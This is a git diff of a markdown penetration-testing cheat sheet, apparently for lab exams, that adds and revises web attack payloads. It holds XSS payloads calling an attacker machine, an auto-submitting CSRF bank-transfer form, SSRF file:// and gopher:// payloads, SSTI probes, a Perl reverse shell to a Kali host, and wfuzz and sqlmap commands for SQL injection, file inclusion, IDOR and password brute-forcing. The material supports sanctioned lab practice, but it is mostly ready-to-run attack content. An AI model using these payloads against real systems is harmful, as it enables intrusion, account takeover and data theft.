@@ -10,42 +10,69 @@ python3 -m http.server 80
 ```
 
 ## XSS (Cross-Site Scripting)
+
+### Manual
 ```shell
-wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt --hh 0 "$URL/index.php?id=FUZZ"
+<script>fetch("http://$KALIMASCHINE/insideScript")</script>
+<script src="http://$KALIMASCHINE/srcScript"></script>
+<img src='x' onerror="fetch('http://$KALIMASCHINE/img')">
+```
+
+### Fuzzing
+```shell
+wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt --hh 0 "$IP/index.php?id=FUZZ"
+wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt -d "username=FUZZ&password=test123" --hh 0 "$IP/login"
 ```
 
 ## CSRF (Cross-Site Request Forgery)
+With XSS e.g. attacker tricks a user into submitting a request to a site where the user already has an active, authenticated session.
+```shell
+<form action="https://bank.com/transfer" method="POST">
+  <input type="hidden" name="amount" value="1000">
+  <input type="hidden" name="to_account" value="999999">
+</form>
 
-...
+<script>
+  document.forms[0].submit();
+</script>
+```
+
+## SSRF (Server‑Side Request Forgery)
+Force an application or server to request data or a resource, where a link can be set.
+```shell
+file:///tmp/foo.txt
+file:///c:/windows/win.ini
+gopher://127.0.0.1:80/_POST%20/status%20HTTP/1.1%0a
+```
 
 ## SQLi (SQL Injection)
 
 ### Fuzzing GET parameter
 ```shell
-wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -u "$URL/index.php?id=FUZZ"
+wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -u "$IP/index.php?id=FUZZ"
 ```
 
 ### Fuzzing POST parameter
 ```shell
-wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d "id=FUZZ" -u "$URL/index.php"
+wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d "id=FUZZ" -u "$IP/index.php"
 ```
 
 ### sqlmap GET parameter
 ```shell
-sqlmap -u "$URL/index.php?id=1"
+sqlmap -u "$IP/index.php?id=1"
 ```
 
 ### sqlmap POST parameter
 Copy POST request from Burp Suite into `post.txt` file
 ```shell
-sqlmap -r post.txt -p parameter
+sqlmap -r request.txt --batch --dump
 ```
 
 ## Directory Traversal
 
 ### Fuzzing LFI default file paths
 ```shell
-wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hh 0 "$URL/index.php?id=FUZZ"
+wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hh 0 "$IP/index.php?id=FUZZ"
 ```
 
 ### Fuzzing LFI app specific files
@@ -58,7 +85,7 @@ Create two wordlists:
    application.properties
    applitcation.yml
 ```shell
-wfuzz -w paths.txt -w files.txt --hh 0 "$URL/index.php?id=FUZZFUZ2Z"
+wfuzz -w paths.txt -w files.txt --hh 0 "$IP/index.php?id=FUZZFUZ2Z"
 ```
 
 ## XXE (XML External Entity)
@@ -86,22 +113,28 @@ Wordlist to use in Burp Suite Intruder for fuzzing XXE: `/usr/share/seclists/Fuz
 
 Note that extracting file with multiple lines may not work due to encoding issues.
 
-## SSRF (Server-side Template Injection)
+## SSTI (Server-side Template Injection)
 
-### Fuzzing SSTI 
+### Discover SSTI 
 ```plaintext
 {{7*7}}
 ${7*7}
-<%= 7*7 %>
-${{7*7}}
-#{7*7}
+#{"7"*7}
+{{7*"7"}}
 ```
-
+with
+```
+{{7*7}} # if 49 => twig
+${7*7} # if 49 => freemarker
+#{"7"*7} # if <49> => pug
+{{7*"7"}} # if 77777777 => jinja
+```
+s
 ## Command Injection 
 
 ### Fuzzing command injection 
 ```shell
-wfuzz -c -z file,"/usr/share/payloadsallthethings/Command Injection/Intruder/command-execution-unix.txt" --sc 200 "$URL/index.php?parameter=idFUZZ"
+wfuzz -c -z file,"/usr/share/payloadsallthethings/Command Injection/Intruder/command-execution-unix.txt" --sc 200 "$IP/index.php?parameter=idFUZZ"
 ```
 
 ### Setup reverse shell listener 
@@ -142,23 +175,38 @@ perl -e 'use Socket;$i="[kali-ip]";$p=4242;socket(S,PF_INET,SOCK_STREAM,getproto
 
 ### Static file IDOR 
 ```shell
-wfuzz -c -z range,1-100 --hc 404 "$URL/index.php?doc=FUZZ.txt"
+wfuzz -c -z range,1-100 --hc 404 "$IP/index.php?doc=FUZZ.txt"
 ```
 
 ### ID based IDOR 
 ```shell
-wfuzz -c -z range,1-100 --hc 404 "$URL/index.php?doc=FUZZ"
+wfuzz -c -z range,1-100 --hc 404 "$IP/index.php?doc=FUZZ"
 ```
 
 ## Brute forcing 
 
+### Create wordlist
+
+cewl $IP -w wordlist.txt
+
 ### Users discovery
 
 ```shell
-wfuzz -c -z file,/usr/share/SecLists/Usernames/top-username-shortlist.txt --hc 404,403 "$URL/login.php?user=FUZZ"
+wfuzz -c -z file,/usr/share/SecLists/Usernames/top-username-shortlist.txt --hc 404,403 "$IP/login.php?user=FUZZ"
 ```
 
 ### Password discovery
 ```shell
-wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt --hc 404,403 -d "username=admin&password=FUZZ" "$URL/login.php"
+wfuzz -c -z file,/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100000.txt --hc 404,403 -d "username=admin&password=FUZZ" "$IP/login.php"
 ```
+
+### Double FUZZ
+```shell
+wfuzz -c -z file,user.txt -z file,/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100000.txt --hw 404 -d "username=FUZZ&password=FUZ2Z&submit=" "$IP/login.php"
+```
+
+## Locations proof.txt
+/proof.txt
+/var/tmp/proof.txt
+/root/proof.txt
+/app/proof.txt
